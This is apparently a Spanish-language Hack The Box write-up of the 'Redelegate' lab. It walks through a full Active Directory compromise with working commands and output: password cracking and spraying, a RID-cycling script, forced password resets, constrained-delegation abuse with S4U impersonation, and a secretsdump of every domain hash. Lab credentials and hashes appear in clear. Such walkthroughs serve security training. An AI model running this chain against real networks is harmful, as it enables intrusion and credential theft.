---
tags:
permalink: /Redelegate-HTB-Writeup
title: Redelegate - Hard (HTB)
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p21,53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49667,49669,50829,50830,50831,50834,50846,59846 10.129.234.50
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 01:52 -03
Nmap scan report for 10.129.234.50
Host is up (0.73s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  12:11AM                  434 CyberAudit.txt
| 10-20-24  04:14AM                 2622 Shared.kdbx
|_10-20-24  12:26AM                  580 TrainingAgenda.txt
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-04 04:54:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Not valid before: 2025-11-03T04:51:24
|_Not valid after:  2026-05-05T04:51:24
|_ssl-date: 2025-11-04T04:55:51+00:00; +1m44s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-04T04:55:30+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
50829/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50830/tcp open  msrpc         Microsoft Windows RPC
50831/tcp open  msrpc         Microsoft Windows RPC
50834/tcp open  msrpc         Microsoft Windows RPC
50846/tcp open  msrpc         Microsoft Windows RPC
59846/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-04T04:55:33
|_  start_date: N/A
|_clock-skew: mean: 1m43s, deviation: 1s, median: 1m43s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.03 seconds
```

# Service enumeration

### RPC / Port 135

Vemos que con la pass en el .txt no son validas para el usuario guest que es el unico user con el que contamos ya que no disponemos de otros, pero ni asi podemos enumerar usuario con `rpcclient`.

```bash
rpcclient -U "" -N 10.129.234.50 
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> ^C
                                                                                                                                                                                          
┌──(root㉿zsln)-[/home/…/Desktop/zsln/htb/redelegate]
└─# nxc smb 10.129.234.50 -u guest -p 'SeasonYear!'
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\guest:SeasonYear! STATUS_LOGON_FAILURE 
                                                                                                                                                                                          
┌──(root㉿zsln)-[/home/…/Desktop/zsln/htb/redelegate]
└─# nxc smb 10.129.234.50 -u guest -p ''           
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\guest: STATUS_ACCOUNT_DISABLED 
```

### FTP / Port 21 

Como vemos que el acceso anonimo por `FTP` esta habilitado nos conectamos y descargamos los archivos dentro del mismo

```bash
 ftp anonymous@10.129.234.50
Connected to 10.129.234.50.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||62621|)
125 Data connection already open; Transfer starting.
10-20-24  12:11AM                  434 CyberAudit.txt
10-20-24  04:14AM                 2622 Shared.kdbx
10-20-24  12:26AM                  580 TrainingAgenda.txt
226 Transfer complete.
ftp> mget *
mget CyberAudit.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||62623|)
150 Opening ASCII mode data connection.
100% |*********************************************************************************************************************************************|   434        0.51 KiB/s    00:00 ETA
226 Transfer complete.
434 bytes received in 00:01 (0.34 KiB/s)
mget Shared.kdbx [anpqy?]? y
229 Entering Extended Passive Mode (|||62625|)
125 Data connection already open; Transfer starting.
100% |*********************************************************************************************************************************************|  2622        2.55 KiB/s    00:00 ETAftp: Reading from network: Interrupted system call
  0% |                                                                                                                                             |    -1        0.00 KiB/s    --:-- ETA
226 Transfer complete.
WARNING! 10 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
mget TrainingAgenda.txt [anpqy?]? 7
229 Entering Extended Passive Mode (|||62626|)
125 Data connection already open; Transfer starting.
100% |*********************************************************************************************************************************************|   580        0.69 KiB/s    00:00 ETA
226 Transfer complete.
580 bytes received in 00:01 (0.45 KiB/s)
ftp>
```

#### CyberAudit.txt

```bash
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

#### TrainingAgenda.txt 

Vemos que en este archivo se menciona la pass `SeasonYear!`, por lo que podria ser una pass valida pero aun no tenemos usuarios. Ademas vemos una fecha y vemos que con respecto a la pass se meciona el año, por lo que podriamos crear password con estaciones de un año como invierno, verano, etc.

```bash
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one


Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?


Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password 


Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them 
```

```bash
cat passwords         
SeasonYear!
Fall2024!
Autumn2024!
Winter2024!
Summer2024!
Spring2024!
```

#### Shared.kdbx

Como vemos que esta protegido por una clave maestra , con `keepass2john` convertimos el archivo a un hash el cual podamos romper con `john`

![{0F331BC0-239C-4238-948C-342EAFDD0525}](images/{0F331BC0-239C-4238-948C-342EAFDD0525}.png)

##### Cracking password

```bash
keepass2john Shared.kdbx > hash     
```

```bash
cat hash              
Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca4e19
```

```bash
john hash --wordlist=passwords
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Fall2024!        (Shared)     
1g 0:00:00:00 DONE (2025-11-04 02:28) 4.000g/s 24.00p/s 24.00c/s 24.00C/s SeasonYear!..Spring2024!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.      
```

Como vemos que ahora tenemos la clave del archivo keepass podemos ver el contenido.

![{FDED2E4D-653D-4501-B91A-ADCABF609051}](images/{FDED2E4D-653D-4501-B91A-ADCABF609051}.png)

#### Validate creds - MSSQL

Estas son las credenciales que conseguimos 

```bash
cat user_pass.txt 
----IT

SQLGUEST:zDPBpaF4FywlqIv11vii
Administrator:Spdv41gg4BlBgSYIW1gF (fs01)
fptuser:SguPZBKdRyxWzvXRWy6U

---FInance 

Timesheet:hMFS4I0Kj8Rcd62vqi5X
Payroll:cVkqz4bCM7kJRSNlgx2G

---Helpdesk

22331144

```

Como veo que una de ellas es para `sql`, puedo intuir que puede ser para el servicio de `mssql` de windows, asi que con `nxc`, las validamos

```bash
nxc mssql redelegate.vl -u SQLGuest -p 'zDPBpaF4FywlqIv11vii'
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.234.50   1433   DC               [-] redelegate.vl\SQLGuest:zDPBpaF4FywlqIv11vii (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
```

Vemos que nos da un error y nos recomineda usar la flag `--local-auth`, probemos con esa.

```bash
 nxc mssql redelegate.vl -u SQLGuest -p 'zDPBpaF4FywlqIv11vii' --local-auth
MSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.234.50   1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
```

## Shell as marie.curie

Como vemos que si, nos conectamos con `mssqlclient` de impacket.

```bash
impacket-mssqlclient 'redelegate.vl/SQLGuest:zDPBpaF4FywlqIv11vii'@10.129.234.50 -target-ip 10.129.234.50              
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SQLGuest  guest@master)> 
```

Como practicamente esta vacia la base de datos, podemos intentar enumerar nuestros privilegios, cuentas del dominio, etc.

```bash
SQL (SQLGuest  guest@msdb)> SELECT DEFAULT_DOMAIN() as mydomain;
mydomain     
----------   
REDELEGATE 
```

Vemos que nuestro dominio es `REDELEGATE`. Asi que ahora podemos intentar enumerar los domains admins.

```bash
QL (SQLGuest  guest@msdb)> SELECT SUSER_SID('REDELEGATE\Domain Admins')
                                                              
-----------------------------------------------------------   
b'010500000000000515000000a185deefb22433798d8e847a00020000' 
```

Como vemos que nos devuelve un valor hexadecimal podemos usar ciberchief para decodificar la cadena y luego externamente hacer solicitudes tratando de saber de quienes son estos `SID`.

```bash
SQL (SQLGuest  guest@msdb)> SELECT SUSER_SNAME(0x010500000000000515000000a185deefb22433798d8e847a00020000)
                           
------------------------   
REDELEGATE\Domain Admins 
```

Para eso creo un script en `bash` q me automatize el `RID Cylcing`.

```bash
#!/bin/bash

check_rid() {
    SID_BASE="010500000000000515000000a185deefb22433798d8e847a"
    local RID=$1
    local HEX_RID=$(python -c "import struct; print(struct.pack('<I', ${RID}).hex())")
    local SID="${SID_BASE}${HEX_RID}"
    local RES=$(impacket-mssqlclient 'redelegate.vl/SQLGuest:zDPBpaF4FywlqIv11vii'@10.129.234.50 -target-ip 10.129.234.50 -file <( echo "select SUSER_SNAME(0x${SID});") 2>&1 | sed -n '/^----/{n;p;}')

    if [[ "$(echo "$RES" | xargs)" != "NULL" ]]; then echo "${RID}: ${RES}"; fi
}

export -f check_rid 
seq 1000 1500 | xargs -P 48 -I{} bash -c 'check_rid $@' _ {}
```

Le damos permisos de ejcucion y lo corremos, y asi vemos como detecta usuario del dominio. ahora con estos podemos tratar de hacer un password spray con las password que recolecte hasta ahora 
```bash
time ./m.sh
1002: REDELEGATE\DC$   
1000: REDELEGATE\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG   
1103: REDELEGATE\FS01$   
1104: REDELEGATE\Christine.Flanders   
1105: REDELEGATE\Marie.Curie   
1106: REDELEGATE\Helen.Frost   
1107: REDELEGATE\Michael.Pontiac   
1108: REDELEGATE\Mallory.Roberts   
1119: REDELEGATE\sql_svc   
1109: REDELEGATE\James.Dinkleberg   
1114: REDELEGATE\Finance   
1115: REDELEGATE\DnsAdmins   
1112: REDELEGATE\Helpdesk   
1113: REDELEGATE\IT   
1116: REDELEGATE\DnsUpdateProxy   
1117: REDELEGATE\Ryan.Cooper
```

```bash
nxc smb redelegate.vl -u userss -p passwords                      
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DC$:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\FS01$:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Christine.Flanders:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Marie.Curie:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Helen.Frost:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Michael.Pontiac:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Mallory.Roberts:SeasonYear! STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\sql_svc:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\James.Dinkleberg:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Finance:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DnsAdmins:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Helpdesk:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\IT:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DnsUpdateProxy:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Ryan.Cooper:SeasonYear! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\DC$:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\FS01$:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [-] redelegate.vl\Christine.Flanders:Fall2024! STATUS_LOGON_FAILURE 
SMB         10.129.234.50   445    DC               [+] redelegate.vl\Marie.Curie:Fall2024!
```

Ahora vemos que tenemos la pass para el usuario `Marie.Curie`, y ademas vemos que el usuario `Mallory.Roberts` tiene la flga : `STATUS_ACCOUNT_RESTRICTION`, eso lo vemos mas adelante.

Una vez viendo esto enumeramos con bloodhound en busca de posibles `ACL` de las que podamos aprovecharnos.

```bash
bloodhound-python -c all -u 'Marie.Curie' -p 'Fall2024!' -ns 10.129.234.50 -d redelegate.vl 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: redelegate.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.redelegate.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.redelegate.vl
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: dc.redelegate.vl
ERROR: Unhandled exception in computer dc.redelegate.vl processing: The NETBIOS connection with the remote host timed out.
INFO: Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 986, in non_polling_read
    received = self._sock.recv(bytes_left)
TimeoutError: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/bloodhound/enumeration/computers.py", line 130, in process_computer
    unresolved = c.rpc_get_group_members(555, c.rdp)
  File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 795, in rpc_get_group_members
    raise e
  File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 728, in rpc_get_group_members
    resp = samr.hSamrConnect(dce)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/samr.py", line 2469, in hSamrConnect
    return dce.request(request)
           ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 860, in request
    self.call(request.opnum, request, uuid)
    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 849, in call
    return self.send(DCERPC_RawCall(function, body.getData(), uuid))
           ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1306, in send
    self._transport_send(data)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1243, in _transport_send
    self._transport.send(rpc_packet.get_packet(), forceWriteAndx = forceWriteAndx, forceRecv = forceRecv)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/transport.py", line 543, in send
    self.__smb_connection.writeFile(self.__tid, self.__handle, data)
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 543, in writeFile
    return self._SMBConnection.writeFile(treeId, fileId, data, offset)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1742, in writeFile
    written = self.write(treeId, fileId, writeData, writeOffset, len(writeData))
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1444, in write
    ans = self.recvSMB(packetID)
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 515, in recvSMB
    data = self._NetBIOSSession.recv_packet(self._timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 917, in recv_packet
    data = self.__read(timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 1004, in __read
    data = self.read_function(4, timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 988, in non_polling_read
    raise NetBIOSTimeout
impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.

INFO: Done in 01M 27S

```

## Shell as helen.frost

Como podemos ver nuestro usuario tiene permisos `ForceChangePasssword` sobre 6 usuarios.

![{CEA7E10B-752B-493D-B749-65178A6EF74A}](images/{CEA7E10B-752B-493D-B749-65178A6EF74A}.png)

Y del cual vemos que Michael.Pontiac posee los mismos privilegios sobre marie.curie y los mismos usuarios.

![{2E974469-5FDE-4F53-848B-E79A605A84A6}](images/{2E974469-5FDE-4F53-848B-E79A605A84A6}.png)

Con esto tambien sabemos que la unica que ademas de ellos posee `acls`, es `helen.frost`. Por lo que tenemos que apuntar a `helen` ya que ademas es parte del `Remote Management Users` lo que significa que podemos conectarnos via `WinRM`, primero para evitar errores solicito un `tgt` para marie.

```bash
impacket-getTGT redelegate.vl/Marie.Curie:'Fall2024!' -dc-ip 10.129.234.50                     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Marie.Curie.ccache
                                                                                                                                                                                          
┌──(root㉿zsln)-[/home/…/Desktop/zsln/htb/redelegate]
└─# export KRB5CCNAME=Marie.Curie.ccache

```

Y ahora con `bloodyAD`, le cambiamos la pass

```bash
bloodyAD -u Marie.Curie -p 'Fall2024!' -d redelegate.vl -k --host dc.redelegate.vl set password helen.frost 'zs1n123!$'
[+] Password changed successfully!
```

```bash
evil-winrm -i redelegate.vl -u helen.frost -p 'zs1n123!$'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents>
```

![{77A23964-C22D-4FD1-B328-1A320CBFE77C}](images/{77A23964-C22D-4FD1-B328-1A320CBFE77C}.png)

Sin embargo vemos que la flag `trust for delegation` esta en false, por lo que podemos activarlo pero para eso necesitamos saber el spn de `FS01$` para poder otorgarnos permisos de delegacion con `msDS-AllowedToDelegateToAccount`

```powershell
Get-NetComputer -Unconstrained


pwdlastset                    : 6/3/2025 11:14:11 AM
logoncount                    : 70
msds-generationid             : {93, 169, 17, 102...}
serverreferencebl             : CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=redelegate,DC=vl
badpasswordtime               : 11/3/2025 10:19:27 PM
distinguishedname             : CN=DC,OU=Domain Controllers,DC=redelegate,DC=vl
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 11/3/2025 8:52:01 PM
name                          : DC
objectsid                     : S-1-5-21-4024337825-2033394866-2055507597-1002
samaccountname                : DC$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 11/4/2025 4:52:01 AM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Standard
instancetype                  : 4
msdfsr-computerreferencebl    : CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=redelegate,DC=vl
objectguid                    : 1567d0d5-960c-4d7d-add6-50d2d6a965ab
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=redelegate,DC=vl
dscorepropagationdata         : {10/19/2024 8:01:42 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {TERMSRV/DC, TERMSRV/dc.redelegate.vl, ldap/dc.redelegate.vl/ForestDnsZones.redelegate.vl, ldap/dc.redelegate.vl/DomainDnsZones.redelegate.vl...}
usncreated                    : 12293
lastlogon                     : 11/3/2025 8:57:26 PM
badpwdcount                   : 2
cn                            : DC
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
whencreated                   : 10/19/2024 8:01:41 AM
primarygroupid                : 516
iscriticalsystemobject        : True
msds-supportedencryptiontypes : 28
usnchanged                    : 94244
ridsetreferences              : CN=RID Set,CN=DC,OU=Domain Controllers,DC=redelegate,DC=vl
dnshostname                   : dc.redelegate.vl
```

Como podemos ver es `ldap/dc.redelegate.vl` ahora podemos activarlo con `Set-ADObject`.

```powershell
 # ==============================================================================
# 1. Obtener la máquina y SPN Objetivo
# ==============================================================================
$CompIdentity = "FS01$"
$TargetSPN = "ldap/dc.redelegate.vl" # EJ: "cifs/FS01.redelegate.vl"
 
# 2. Desactivar la Delegación Sin Restricciones (Limpieza)
#    La bandera TRUSTED_FOR_DELEGATION es 524288. Usamos -band -bnot para APAGARLA.
$UAC = (Get-ADComputer -Identity $CompIdentity -Properties UserAccountControl).UserAccountControl
$FLAG_DELEGACION = 524288
$NewUAC = $UAC -band -bnot $FLAG_DELEGACION # Usa Bitwise NOT para apagar el bit
Set-ADObject -Identity $CompIdentity -Replace @{UserAccountControl = $NewUAC}
 
Write-Host "Delegación Sin Restricciones desactivada en $CompIdentity."
 
# 3. Activar la Delegación Restringida (Escribir msDS-AllowedToDelegateTo)
#    Usamos Set-ADObject con la operación -Add o -Replace para el atributo msDS-AllowedToDelegateTo
#    Usamos -Replace si queremos eliminar cualquier valor anterior y poner solo este.
Set-ADObject -Identity $CompIdentity -Replace @{ "msDS-AllowedToDelegateTo" = $TargetSPN }
 
Write-Host "Delegación Restringida configurada: $CompIdentity ahora puede delegar a $TargetSPN."
Delegación Sin Restricciones desactivada en FS01$.
Delegación Restringida configurada: FS01$ ahora puede delegar a ldap/dc.redelegate.vl.
```

Ya una vez hecho esto, usando las creds de `helen`, podemos cambiarle la pass con `bloodyAD`.

```bash
bloodyAD -u helen.frost -p 'zs1n123!$' -d redelegate.vl -k --host dc.redelegate.vl set password FS01$ 'zs1n123!$'
[+] Password changed successfully!
```

Y ahora con `getST` solicitamos el `ccache` para la computadora del dominio.
```bash
impacket-getST 'redelegate.vl/FS01$:zs1n123!$' -spn ldap/dc.redelegate.vl -impersonate dc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

Exportamos a la variables de Kerberos
```bash                                                      
export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

Y ahora con `secretsdump` dumpeamos los hashes de todos los usuarios incluyendo los del usuario `Administrator`.
```bash                                       
impacket-secretsdump  -k -no-pass -dc-ip 10.129.234.50 dc.redelegate.vl    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::
Marie.Curie:1105:aad3b435b51404eeaad3b435b51404ee:a4bc00e2a5edcec18bd6266e6c47d455:::
Helen.Frost:1106:aad3b435b51404eeaad3b435b51404ee:7b3a22fdfbf8dcafb39c97f8f197f35e:::
Michael.Pontiac:1107:aad3b435b51404eeaad3b435b51404ee:f37d004253f5f7525ef9840b43e5dad2:::
Mallory.Roberts:1108:aad3b435b51404eeaad3b435b51404ee:980634f9aabfe13aec0111f64bda50c9:::
James.Dinkleberg:1109:aad3b435b51404eeaad3b435b51404ee:2716d39cc76e785bd445ca353714854d:::
Ryan.Cooper:1117:aad3b435b51404eeaad3b435b51404ee:062a12325a99a9da55f5070bf9c6fd2a:::
sql_svc:1119:aad3b435b51404eeaad3b435b51404ee:76a96946d9b465ec76a4b0b316785d6b:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:bfdff77d74764b0d4f940b7e9f684a61:::
FS01$:1103:aad3b435b51404eeaad3b435b51404ee:7b3a22fdfbf8dcafb39c97f8f197f35e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173
Administrator:aes128-cts-hmac-sha1-96:b4fb863396f4c7a91c49ba0c0637a3ac
Administrator:des-cbc-md5:102f86737c3e9b2f
krbtgt:aes256-cts-hmac-sha1-96:bff2ae7dfc202b4e7141a440c00b91308c45ea918b123d7e97cba1d712e6a435
krbtgt:aes128-cts-hmac-sha1-96:9690508b681c1ec11e6d772c7806bc71
krbtgt:des-cbc-md5:b3ce46a1fe86cb6b
